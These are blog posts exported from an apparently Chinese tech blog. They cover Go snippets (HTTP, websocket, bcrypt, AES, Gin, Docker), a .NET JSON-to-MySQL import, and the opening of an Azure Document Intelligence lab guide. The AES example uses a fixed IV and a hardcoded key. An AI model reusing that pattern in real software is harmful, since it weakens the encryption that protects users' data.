Lastname string `json:&quot;lastname&quot;` Age int `json:&quot;age&quot;`&#125;func main() &#123; http.HandleFunc(&quot;/decode&quot;, func(w http.ResponseWriter, r *http.Request) &#123; var user User json.NewDecoder(r.Body).Decode(&amp;user) fmt.Fprintf(w, &quot;%s %s is %d years old!&quot;, user.Firstname, user.Lastname, user.Age) &#125;) http.HandleFunc(&quot;/encode&quot;, func(w http.ResponseWriter, r *http.Request) &#123; peter := User&#123; Firstname: &quot;m&quot;, Lastname: &quot;s&quot;, Age: 25, &#125; json.NewEncoder(w).Encode(peter) &#125;) http.ListenAndServe(&quot;:24614&quot;, nil)&#125;//&#123;&quot;firstname&quot;:&quot;e&quot;,&quot;lastname&quot;:&quot;m&quot;,&quot;age&quot;:28&#125;//curl -s -XPOST -d&#x27;&#123;&quot;firstname&quot;:&quot;e&quot;,&quot;lastname&quot;:&quot;m&quot;,&quot;age&quot;:28&#125;&#x27; http://localhost:24614/decode//curl -s http://localhost:8080/encode webapi get123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package main import ( &quot;encoding/json&quot; &quot;fmt&quot; &quot;io/ioutil&quot; &quot;log&quot; &quot;net/http&quot; ) // 定义与JSON响应相对应的结构体 type APIResponse struct &#123; IsOk bool `json:&quot;isOk&quot;` Code int `json:&quot;code&quot;` Msg string `json:&quot;msg&quot;` RsData interface&#123;&#125; `json:&quot;rsData&quot;` // 如果rsData可能是不同的类型，可以使用interface&#123;&#125; &#125; func main() &#123; // 设置API的URL url :=&quot;https://localhost:32768/api/v10/xxx/rsRsModel2?t1=1&quot; // 发送GET请求 resp, err := http.Get(url) if err != nil &#123; log.Fatal(err) &#125; defer resp.Body.Close() // 确保关闭响应体 // 读取响应体 body, err := ioutil.ReadAll(resp.Body) if err != nil &#123; log.Fatal(err) &#125; // 解析JSON响应 var result APIResponse err = json.Unmarshal(body, &amp;result) if err != nil &#123; log.Fatal(err) &#125; // 打印结果 fmt.Printf(&quot;IsOk: %v\\n&quot;, result.IsOk) fmt.Printf(&quot;Code: %d\\n&quot;, result.Code) fmt.Printf(&quot;Msg: %s\\n&quot;, result.Msg) fmt.Printf(&quot;RsData: %v\\n&quot;, result.RsData) if result.IsOk &amp;&amp; result.Code == 1 &#123; &#125; else &#123; &#125; &#125; websocket123456789101112131415161718192021222324252627282930313233343536373839404142package mainimport ( &quot;fmt&quot; &quot;net/http&quot; &quot;github.com/gorilla/websocket&quot;)var upgrader = websocket.Upgrader&#123; ReadBufferSize: 1024, WriteBufferSize: 1024,&#125;func main() &#123; http.HandleFunc(&quot;/echo&quot;, func(w http.ResponseWriter, r *http.Request) &#123; conn, _ := upgrader.Upgrade(w, r, nil) // error ignored for sake of simplicity for &#123; // Read message from browser msgType, msg, err := conn.ReadMessage() if err != nil &#123; return &#125; // Print the message to the console fmt.Printf(&quot;%s sent: %s\\n&quot;, conn.RemoteAddr(), string(msg)) // Write message back to browser if err = conn.WriteMessage(msgType, msg); err != nil &#123; return &#125; &#125; &#125;) http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) &#123; http.ServeFile(w, r, &quot;ws.html&quot;) &#125;) http.ListenAndServe(&quot;:24614&quot;, nil)&#125; 12345678910111213141516171819202122&lt;input id=&quot;input&quot; type=&quot;text&quot; /&gt;&lt;button onclick=&quot;send()&quot;&gt;Send&lt;/button&gt;&lt;pre id=&quot;output&quot;&gt;&lt;/pre&gt;&lt;script&gt; var input = document.getElementById(&quot;input&quot;); var output = document.getElementById(&quot;output&quot;); var socket = new WebSocket(&quot;ws://localhost:24614/echo&quot;); socket.onopen = function () &#123; output.innerHTML += &quot;Status: Connected\\n&quot;; &#125;; socket.onmessage = function (e) &#123; output.innerHTML += &quot;Server: &quot; + e.data + &quot;\\n&quot;; &#125;; function send() &#123; socket.send(input.value); input.value = &quot;&quot;; &#125;&lt;/script&gt; hash12345678910111213141516171819202122232425262728package mainimport ( &quot;fmt&quot; &quot;golang.org/x/crypto/bcrypt&quot;)func HashPassword(password string) (string, error) &#123; bytes, err := bcrypt.GenerateFromPassword([]byte(password), 14) return string(bytes), err&#125;func CheckPasswordHash(password, hash string) bool &#123; err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password)) return err == nil&#125;func main() &#123; password := &quot;musu&quot; hash, _ := HashPassword(password) // ignore error for the sake of simplicity fmt.Println(&quot;Password:&quot;, password) fmt.Println(&quot;Hash: &quot;, hash) match := CheckPasswordHash(password, hash) fmt.Println(&quot;Match: &quot;, match)&#125; aes123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package mainimport (// &quot;bytes&quot; &quot;crypto/aes&quot; &quot;crypto/cipher&quot; &quot;encoding/base64&quot; &quot;fmt&quot;)func Encrypt(plainText, key string) (string, error) &#123; block, err := aes.NewCipher([]byte(key)) if err != nil &#123; return &quot;&quot;, err &#125; iv := []byte&#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 0, 0, 0, 0, 0, 0&#125; cfb := cipher.NewCFBEncrypter(block, iv) ciphertext := make([]byte, len(plainText)) cfb.XORKeyStream(ciphertext, []byte(plainText)) return base64.StdEncoding.EncodeToString(ciphertext), nil&#125;func Decrypt(cipherText, key string) (string, error) &#123; block, err := aes.NewCipher([]byte(key)) if err != nil &#123; return &quot;&quot;, err &#125; decryptedBytes, err := base64.StdEncoding.DecodeString(cipherText) if err != nil &#123; return &quot;&quot;, err &#125; iv := []byte&#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 0, 0, 0, 0, 0, 0&#125; cfb := cipher.NewCFBDecrypter(block, iv) plaintext := make([]byte, len(decryptedBytes)) cfb.XORKeyStream(plaintext, decryptedBytes) return string(plaintext), nil&#125;func main() &#123; plainText := &quot;mus11test111u&quot; key := &quot;thisisaverysecretkeymusu&quot; // 加密 encrypted, err := Encrypt(plainText, key) if err != nil &#123; fmt.Println(&quot;Encryption failed:&quot;, err) return &#125; fmt.Println(&quot;Encrypted:&quot;, encrypted) //encrypted = &quot;2gAFF&quot; // 解密 decrypted, err := Decrypt(encrypted, key) if err != nil &#123; fmt.Println(&quot;Decryption failed:&quot;, err) return &#125; fmt.Println(&quot;Decrypted:&quot;, decrypted)&#125; gin有点像express.js 1go get -u github.com/gin-gonic/gin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package mainimport ( &quot;github.com/gin-gonic/gin&quot; &quot;fmt&quot; &quot;net/http&quot;)type User struct &#123; Name string `json:&quot;name&quot;` Age int `json:&quot;age&quot;`&#125;func main() &#123; r := gin.Default() //middleware r.Use(func(c *gin.Context) &#123; fmt.Println(&quot;middleware called&quot;) c.Next() &#125;) r.GET(&quot;/&quot;, func(c *gin.Context) &#123; c.String(200, &quot;hello ~ &quot;) &#125;) //router r.GET(&quot;/user/:name&quot;, func(c *gin.Context) &#123; name := c.Param(&quot;name&quot;) c.String(200, &quot;hi, %s!&quot;, name) &#125;) //static r.Static(&quot;/static&quot;, &quot;./static&quot;) /////http://localhost:24614/user/m //get r.GET(&quot;/users&quot;, func(c *gin.Context) &#123; user := User&#123;Name: &quot;mu&quot;, Age: 15&#125; c.JSON(http.StatusOK, user)//users &#125;) // err r.NoRoute(func(c *gin.Context) &#123; c.JSON(http.StatusNotFound, gin.H&#123;&quot;error&quot;: &quot;Page not found&quot;&#125;) &#125;) r.Run(&quot;:24614&quot;)&#125; dockermain.go 123456789101112131415161718192021222324252627282930313233# 使用官方的 Go 运行时作为基础镜像FROM golang:1.18-alpine as builder# 设置工作目录WORKDIR /app# 将源代码复制到工作目录COPY . .# 设置 GOPATH 和 GOBIN（可选）ENV GOPATH=/goENV PATH=$GOPATH/bin:$PATH# 构建 Go 应用RUN go build -o app .# 使用 Alpine Linux 作为最终的运行时环境FROM alpine:latest# 设置工作目录WORKDIR /app# 将编译好的二进制文件从 builder 阶段复制到最终镜像COPY --from=builder /app/app /app/app# 给二进制文件添加执行权限RUN chmod +x /app/app# 暴露应用需要监听的端口EXPOSE 8080# 设置容器启动时运行的命令CMD [&quot;/app/app&quot;] build 12docker build -t your-image-name .docker run -p 8080:8080 your-image-name 1http://localhost:8080/ push 12docker logindocker push your-image-name","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"go","slug":"go","permalink":"https://banjinmei.github.io/tags/go/"}],"author":"mu"},{"title":".NET JSON2MySQL","slug":"NET-JSON2MySQL","date":"2024-06-12T14:35:33.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/12/NET-JSON2MySQL/","permalink":"https://banjinmei.github.io/2024/06/12/NET-JSON2MySQL/","excerpt":"","text":"这是一段json 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454[ &#123; &quot;id&quot;: 1, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101010100&quot;, &quot;city_name&quot;: &quot;北京&quot;, &quot;post_code&quot;: &quot;100000&quot;, &quot;area_code&quot;: &quot;010&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:06&quot; &#125;, &#123; &quot;id&quot;: 2, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;安徽&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 3, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;福建&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 4, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;甘肃&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 5, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;广东&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 6, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;广西&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 7, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;贵州&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 8, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;海南&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: &quot;2024-06-11 17:03:37&quot; &#125;, &#123; &quot;id&quot;: 9, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;河北&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: &quot;2024-06-11 17:30:06&quot; &#125;, &#123; &quot;id&quot;: 10, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;河南&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: &quot;2024-06-11 17:30:07&quot; &#125;, &#123; &quot;id&quot;: 11, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;黑龙江&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 12, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;湖北&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 13, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;湖南&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 14, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;吉林&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: &quot;2024-06-11 17:30:07&quot; &#125;, &#123; &quot;id&quot;: 15, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;江苏&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 16, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;江西&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 17, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;辽宁&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 18, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;内蒙古&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 19, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;宁夏&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 20, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;青海&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 21, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;山东&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 22, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;山西&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 23, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;陕西&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 24, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101020100&quot;, &quot;city_name&quot;: &quot;上海&quot;, &quot;post_code&quot;: &quot;200000&quot;, &quot;area_code&quot;: &quot;021&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:08&quot; &#125;, &#123; &quot;id&quot;: 25, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;四川&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 26, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101030100&quot;, &quot;city_name&quot;: &quot;天津&quot;, &quot;post_code&quot;: &quot;300000&quot;, &quot;area_code&quot;: &quot;022&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:08&quot; &#125;, &#123; &quot;id&quot;: 27, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;西藏&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 28, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;新疆&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 29, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;云南&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 30, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;浙江&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 31, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101040100&quot;, &quot;city_name&quot;: &quot;重庆&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: &quot;023&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:08&quot; &#125;, &#123; &quot;id&quot;: 32, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101320101&quot;, &quot;city_name&quot;: &quot;香港&quot;, &quot;post_code&quot;: &quot;999077&quot;, &quot;area_code&quot;: &quot;+852&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:03:38&quot; &#125;, &#123; &quot;id&quot;: 33, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;101330101&quot;, &quot;city_name&quot;: &quot;澳门&quot;, &quot;post_code&quot;: &quot;999078&quot;, &quot;area_code&quot;: &quot;+853&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:03:39&quot; &#125;, &#123; &quot;id&quot;: 34, &quot;pid&quot;: 0, &quot;city_code&quot;: &quot;&quot;, &quot;city_name&quot;: &quot;台湾&quot;, &quot;post_code&quot;: null, &quot;area_code&quot;: null, &quot;ctime&quot;: null &#125;, &#123; &quot;id&quot;: 35, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220601&quot;, &quot;city_name&quot;: &quot;安庆&quot;, &quot;post_code&quot;: &quot;246000&quot;, &quot;area_code&quot;: &quot;0556&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:10&quot; &#125;, &#123; &quot;id&quot;: 36, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220201&quot;, &quot;city_name&quot;: &quot;蚌埠&quot;, &quot;post_code&quot;: &quot;233000&quot;, &quot;area_code&quot;: &quot;0552&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:10&quot; &#125;, &#123; &quot;id&quot;: 37, &quot;pid&quot;: 3400, &quot;city_code&quot;: &quot;101220105&quot;, &quot;city_name&quot;: &quot;巢湖市&quot;, &quot;post_code&quot;: &quot;238000&quot;, &quot;area_code&quot;: &quot;0551&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:03:40&quot; &#125;, &#123; &quot;id&quot;: 38, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221701&quot;, &quot;city_name&quot;: &quot;池州&quot;, &quot;post_code&quot;: &quot;247100&quot;, &quot;area_code&quot;: &quot;0566&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:10&quot; &#125;, &#123; &quot;id&quot;: 39, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221101&quot;, &quot;city_name&quot;: &quot;滁州&quot;, &quot;post_code&quot;: &quot;239000&quot;, &quot;area_code&quot;: &quot;0550&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:10&quot; &#125;, &#123; &quot;id&quot;: 40, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220801&quot;, &quot;city_name&quot;: &quot;阜阳&quot;, &quot;post_code&quot;: &quot;236000&quot;, &quot;area_code&quot;: &quot;0558&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:10&quot; &#125;, &#123; &quot;id&quot;: 41, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221201&quot;, &quot;city_name&quot;: &quot;淮北&quot;, &quot;post_code&quot;: &quot;235000&quot;, &quot;area_code&quot;: &quot;0561&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:11&quot; &#125;, &#123; &quot;id&quot;: 42, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220401&quot;, &quot;city_name&quot;: &quot;淮南&quot;, &quot;post_code&quot;: &quot;232000&quot;, &quot;area_code&quot;: &quot;0554&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:11&quot; &#125;, &#123; &quot;id&quot;: 43, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221001&quot;, &quot;city_name&quot;: &quot;黄山市&quot;, &quot;post_code&quot;: &quot;245000&quot;, &quot;area_code&quot;: &quot;0559&quot;, &quot;ctime&quot;: &quot;2024-06-11 21:23:56&quot; &#125;, &#123; &quot;id&quot;: 44, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221501&quot;, &quot;city_name&quot;: &quot;六安&quot;, &quot;post_code&quot;: &quot;237000&quot;, &quot;area_code&quot;: &quot;0564&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:11&quot; &#125;, &#123; &quot;id&quot;: 45, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220501&quot;, &quot;city_name&quot;: &quot;马鞍山&quot;, &quot;post_code&quot;: &quot;243000&quot;, &quot;area_code&quot;: &quot;0555&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:11&quot; &#125;, &#123; &quot;id&quot;: 46, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220701&quot;, &quot;city_name&quot;: &quot;宿州&quot;, &quot;post_code&quot;: &quot;234000&quot;, &quot;area_code&quot;: &quot;0557&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:11&quot; &#125;, &#123; &quot;id&quot;: 47, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221301&quot;, &quot;city_name&quot;: &quot;铜陵&quot;, &quot;post_code&quot;: &quot;244000&quot;, &quot;area_code&quot;: &quot;0562&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:12&quot; &#125;, &#123; &quot;id&quot;: 48, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220301&quot;, &quot;city_name&quot;: &quot;芜湖市&quot;, &quot;post_code&quot;: &quot;241000&quot;, &quot;area_code&quot;: &quot;0553&quot;, &quot;ctime&quot;: &quot;2024-06-11 21:23:57&quot; &#125;, &#123; &quot;id&quot;: 49, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101221401&quot;, &quot;city_name&quot;: &quot;宣城&quot;, &quot;post_code&quot;: &quot;242000&quot;, &quot;area_code&quot;: &quot;0563&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:12&quot; &#125;, &#123; &quot;id&quot;: 50, &quot;pid&quot;: 2, &quot;city_code&quot;: &quot;101220901&quot;, &quot;city_name&quot;: &quot;亳州&quot;, &quot;post_code&quot;: &quot;236800&quot;, &quot;area_code&quot;: &quot;0558&quot;, &quot;ctime&quot;: &quot;2024-06-11 17:30:12&quot; &#125; //... ] SQL 123456789101112CREATE TABLE CityInfo (CtId INT NOT NULL AUTO_INCREMENT,Pid INT DEFAULT &#x27;0&#x27;,CityCode VARCHAR(20) DEFAULT &#x27;&#x27;,CityName VARCHAR(110) DEFAULT &#x27;&#x27;,PostCode VARCHAR(20) DEFAULT &#x27;&#x27;,AreaCode VARCHAR(20) DEFAULT &#x27;&#x27;,Ctime DATETIME DEFAULT NULL,CtimeInt bigint DEFAULT &#x27;0&#x27;,LangType INT DEFAULT &#x27;0&#x27;,PRIMARY KEY (CtId)); .NET类 123456789101112public class CityInfo&#123; public int CtId &#123; get; set; &#125; public int Pid &#123; get; set; &#125; public string CityCode &#123; get; set; &#125; public string CityName &#123; get; set; &#125; public string PostCode &#123; get; set; &#125; public string AreaCode &#123; get; set; &#125; public DateTime? Ctime &#123; get; set; &#125; public long CtimeInt &#123; get; set; &#125; public int LangType &#123; get; set; &#125;&#125; 后端处理json file &gt;&gt;&gt; class &gt;&gt;&gt; sql 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[HttpPost] public ActionResult ImportCities(IFormFile file) &#123; try &#123; if (file == null || file.Length == 0) &#123; return Json(new &#123; success = false, message = &quot;No file uploaded.&quot; &#125;); &#125; using (var streamReader = new StreamReader(file.InputStream)) &#123; var jsonData = streamReader.ReadToEnd(); var cityList = JsonConvert.DeserializeObject&lt;List&lt;CityInfo&gt;&gt;(jsonData); using (MySqlConnection connection = new MySqlConnection(ConnectionString)) &#123; connection.Open(); foreach (var city in cityList) &#123; string query = &quot;INSERT INTO IMCityInfo (Pid, CityCode, CityName, PostCode, AreaCode, Ctime, CtimeInt, LangType) VALUES (@Pid, @CityCode, @CityName, @PostCode, @AreaCode, @Ctime, @CtimeInt, @LangType)&quot;; using (MySqlCommand command = new MySqlCommand(query, connection)) &#123; command.Parameters.AddWithValue(&quot;@Pid&quot;, city.Pid); command.Parameters.AddWithValue(&quot;@CityCode&quot;, city.CityCode); command.Parameters.AddWithValue(&quot;@CityName&quot;, city.CityName); command.Parameters.AddWithValue(&quot;@PostCode&quot;, city.PostCode); command.Parameters.AddWithValue(&quot;@AreaCode&quot;, city.AreaCode); command.Parameters.AddWithValue(&quot;@Ctime&quot;, city.Ctime); command.Parameters.AddWithValue(&quot;@CtimeInt&quot;, city.CtimeInt); command.Parameters.AddWithValue(&quot;@LangType&quot;, city.LangType); command.ExecuteNonQuery(); &#125; &#125; &#125; &#125; return Json(new &#123; success = true, message = &quot;Data imported successfully.&quot; &#125;); &#125; catch (Exception ex) &#123; return Json(new &#123; success = false, message = ex.Message &#125;); &#125; &#125; 前端上传JSON 12345678&lt;form id=&quot;uploadForm&quot;&gt; &lt;input type=&quot;file&quot; id=&quot;jsonFile&quot; accept=&quot;.json&quot;&gt; &lt;button type=&quot;submit&quot;&gt;Upload JSON File&lt;/button&gt; &lt;/form&gt; &lt;div id=&quot;response&quot;&gt;&lt;/div&gt; &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt; 1234567891011121314151617181920212223242526272829$(document).ready(function () &#123; $(&#x27;#uploadForm&#x27;).on(&#x27;submit&#x27;, function (event) &#123; event.preventDefault(); // Prevent the default form submission var formData = new FormData(); var fileInput = $(&#x27;#jsonFile&#x27;)[0]; if (fileInput.files.length &gt; 0) &#123; var file = fileInput.files[0]; formData.append(&#x27;file&#x27;, file); $.ajax(&#123; url: &#x27;/ImportCities&#x27;, // Adjust this URL to match your API endpoint type: &#x27;POST&#x27;, data: formData, processData: false, // Important! contentType: false, // Important! success: function (response) &#123; $(&#x27;#response&#x27;).text(&#x27;Success: &#x27; + response.message); &#125;, error: function (error) &#123; $(&#x27;#response&#x27;).text(&#x27;Error: &#x27; + error.responseJSON.error); &#125; &#125;); &#125; else &#123; $(&#x27;#response&#x27;).text(&#x27;Please select a file.&#x27;); &#125; &#125;);&#125;);","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"MySQL","slug":"MySQL","permalink":"https://banjinmei.github.io/tags/MySQL/"},{"name":"JSON","slug":"JSON","permalink":"https://banjinmei.github.io/tags/JSON/"}],"author":"mu"},{"title":"Azure AI Document Intelligence","slug":"Azure-AI-Document-Intelligence","date":"2024-06-07T15:06:10.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/06/07/Azure-AI-Document-Intelligence/","permalink":"https://banjinmei.github.io/2024/06/07/Azure-AI-Document-Intelligence/","excerpt":"","text":"创建智能文档处理解决方案在第二级中，这3个模块，每一个中都有不同的任务操作，这些操作包括使用 Azure 进行实际创建服务操作或者使用代码调用 Azure的服务，这些代码可以使用python或者C#，这些进行选择。所有的模块内的考试是通过一个邮件的方式进行告知。 https://learn.microsoft.com/en-us/credentials/applied-skills/create-intelligent-document-solution-azure-ai/#applied-skill-take-the-assessment start 登陆实验环境 加载成功后会出现虚拟机器登陆界面，找到右侧的 Step1 中的用户名密码。登陆获取实验账号并登陆 Azure进入到机器后，点击桌面的 Email 图片，打开我们的实验目标。 打开桌面的 email 后，会出现如下的界面。这里主要关注两点： 一个是左侧蓝色的部分：Inbox，这里包括环境信息以及实验目标考题。另一个是浏览器的页签中的第二个，也就是登陆 Azure 的环境网址 点击上图的 Azure 标签页，进入登陆页面，用email提供的账号密码登陆 试验一： Create a prototype点击邮件中的 Create a prototype 菜单会出现具体的内容要求。 在第一个实验中主要是使用微软的只能存储服务，并且创建的时候要符合要求，这个服务要满足的要求是要保存所给的文件成Json文件，之后在保存到 Azure 的存储服务中。 实验流程操作首先到 Azure 中，搜索所给出的资源组，选择 RG1开头的资源组 进入到资源组后，点击创建按钮。在搜索框中输入document intelligence 点击选择。 点击 文档智能服务 进入到服务后，点击蓝色的创建按钮。 在这里直接选择默认的订阅以及资源组，Region 目前建议选择 Japan East（如果后面的步骤，在运行分析文档时，遇到权限不足问题，请在此步骤选择其他 Region ） 在这里名字填入：from-document-xxx，如（from-document-01）价格层要选择免费层，也就是下图中的 Free F0，之后点击预览创建按钮。 